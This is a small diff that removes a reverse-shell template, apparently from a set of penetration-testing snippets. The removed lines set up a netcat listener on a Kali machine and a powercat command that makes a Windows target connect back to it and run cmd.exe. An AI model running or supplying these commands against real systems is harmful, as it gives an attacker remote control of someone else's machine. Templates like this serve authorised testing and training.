@@ -1,8 +1,0 @@
-# description: Windows connects back to Kali and runs cmd.exe
-# stage: Kali shell: listen for reverse cmd
-nc -lvnp $lport
-
-# stage: Target PowerShell: connect and run cmd.exe
-$LHOST = "$lhost"
-$PORT = $lport
-powercat -c $LHOST -p $PORT -e cmd.exe
